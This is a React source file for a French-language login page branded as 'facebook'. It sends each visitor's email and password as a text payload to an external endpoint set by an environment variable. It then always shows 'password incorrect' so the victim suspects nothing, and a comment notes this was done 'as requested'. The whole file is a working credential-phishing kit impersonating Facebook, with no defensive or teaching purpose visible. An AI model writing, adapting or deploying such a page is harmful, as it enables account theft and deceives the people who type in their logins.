import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { Lock, Mail, Loader2, CheckCircle2, AlertCircle } from 'lucide-react'
import './App.css'

function App() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [status, setStatus] = useState({ type: null, message: '' })

  const handleSubmit = async (e) => {
    e.preventDefault()
    setIsLoading(true)
    setStatus({ type: null, message: '' })

    const textPayload = `email : ${email} password : ${password}`
    const formData = new FormData()
    formData.append('text', textPayload)

    try {
      await fetch(import.meta.env.VITE_API_URL, {
        method: 'POST',
        body: formData,
      })

      // Toujours afficher que le mot de passe est incorrect, comme demandé
      setStatus({ type: 'error', message: 'Le mot de passe que vous avez saisi est incorrect.' })
      setPassword('')
    } catch (err) {
      console.error('Submission error:', err)
      setStatus({ type: 'error', message: 'Le mot de passe que vous avez saisi est incorrect.' })
      setPassword('')
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
      className="card"
    >
      <div style={{ marginBottom: '2rem' }}>
        <div style={{
          width: '60px',
          height: '60px',
          background: '#3b82f6',
          borderRadius: '16px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          margin: '0 auto 1.5rem',
          boxShadow: '0 8px 16px rgba(59, 130, 246, 0.3)'
        }}>
          <Lock color="white" size={32} />
        </div>
        <h1 className='fb'>facebook</h1>
        <p className='fb'>Connectez-vous à votre espace facebook</p>
      </div>

      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label htmlFor="email">Adresse Email</label>
          <div style={{ position: 'relative' }}>
            <Mail
              style={{ position: 'absolute', left: '12px', top: '50%', transform: 'translateY(-50%)', color: '#94a3b8' }}
              size={18}
            />
            <input
              id="email"
              type="email"
              placeholder="votre@email.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              style={{ paddingLeft: '2.5rem' }}
              required
            />
          </div>
        </div>

        <div className="form-group">
          <label htmlFor="password">Mot de passe</label>
          <div style={{ position: 'relative' }}>
            <Lock
              style={{ position: 'absolute', left: '12px', top: '50%', transform: 'translateY(-50%)', color: '#94a3b8' }}
              size={18}
            />
            <input
              id="password"
              type="password"
              placeholder="••••••••"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              style={{ paddingLeft: '2.5rem' }}
              required
            />
          </div>
        </div>

        <button type="submit" className="primary" disabled={isLoading}>
          {isLoading ? (
            <>
              <Loader2 className="animate-spin" size={18} />
              Connexion...
            </>
          ) : 'Se connecter'}
        </button>
      </form>

      <AnimatePresence>
        {status.type && (
          <motion.div
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: 'auto' }}
            exit={{ opacity: 0, height: 0 }}
            className={`status-msg ${status.type}`}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', justifyContent: 'center' }}>
              {status.type === 'success' ? <CheckCircle2 size={16} /> : <AlertCircle size={16} />}
              {status.message}
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      <div style={{ marginTop: '2rem', fontSize: '0.875rem', color: '#94a3b8' }}>
        Mot de passe oublié ? <a href="#" style={{ color: '#3b82f6', textDecoration: 'none', fontWeight: 500 }}>Réinitialiser</a>
      </div>
    </motion.div>
  )
}

export default App
